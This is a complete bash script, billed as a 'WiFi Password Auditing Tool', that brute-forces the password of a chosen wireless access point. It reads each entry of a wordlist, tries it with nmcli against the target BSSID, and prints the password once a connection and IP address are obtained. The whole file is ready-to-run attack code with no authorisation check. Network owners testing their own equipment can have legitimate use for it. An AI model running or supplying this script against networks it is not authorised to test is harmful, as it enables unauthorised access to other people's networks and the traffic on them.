#!/bin/bash

# WiFi Password Auditing Tool - BSSID Version
# Usage: sudo ./wifi-bruteforce-bssid.sh <BSSID> <WORDLIST_FILE>

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: sudo ./wifi-bruteforce-bssid.sh <BSSID> <WORDLIST>"
    echo "Example: sudo ./wifi-bruteforce-bssid.sh 94:3C:96:EC:9F:?? /path/to/passwords.txt"
    exit 1
fi

BSSID="$1"
WORDLIST="$2"
INTERFACE="wlp4s0"
ETHERNET="enp2s0"

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    ip link set "$ETHERNET" up 2>/dev/null
    nmcli device connect "$ETHERNET" 2>/dev/null
    nmcli radio wifi on
    exit 0
}

trap cleanup SIGINT SIGTERM

# Disable ethernet
echo "Disabling ethernet..."
ip link set "$ETHERNET" down
sleep 2

# Count passwords
TOTAL=$(wc -l < "$WORDLIST")
ATTEMPT=0
FOUND=false

echo -e "${YELLOW}================================${NC}"
echo -e "Target BSSID: ${BLUE}$BSSID${NC}"
echo -e "Interface: ${BLUE}$INTERFACE${NC}"
echo -e "Wordlist: ${BLUE}$WORDLIST${NC} ($TOTAL passwords)"
echo -e "${YELLOW}================================${NC}"

# Main loop
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [ -z "$PASSWORD" ] && continue
    
    ATTEMPT=$((ATTEMPT + 1))
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"
    
    # Disconnect first
    nmcli device disconnect "$INTERFACE" &>/dev/null
    sleep 1
    
    # Try to connect using BSSID
    nmcli device wifi connect "$BSSID" password "$PASSWORD" ifname "$INTERFACE" &>/dev/null &
    PID=$!
    
    # Wait and check
    CONNECTED=false
    for i in {1..15}; do
        sleep 1
        
        # Check if connected to this BSSID
        CURRENT_BSSID=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Access Point: [0-9A-F:]*" | cut -d' ' -f3)
        IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
        
        if [ "$CURRENT_BSSID" = "$BSSID" ] && [ -n "$IP_ADDR" ]; then
            CONNECTED=true
            break
        fi
    done
    
    kill $PID 2>/dev/null
    
    if [ "$CONNECTED" = true ]; then
        echo -e "\n${GREEN}SUCCESS! Password: $PASSWORD${NC}"
        echo -e "IP Address: $IP_ADDR"
        FOUND=true
        break
    fi
    
done < "$WORDLIST"

# Cleanup
echo ""
if [ "$FOUND" = false ]; then
    echo -e "${RED}Password not found${NC}"
fi

ip link set "$ETHERNET" up
nmcli device connect "$ETHERNET" 2>/dev/null
trap - SIGINT SIGTERM
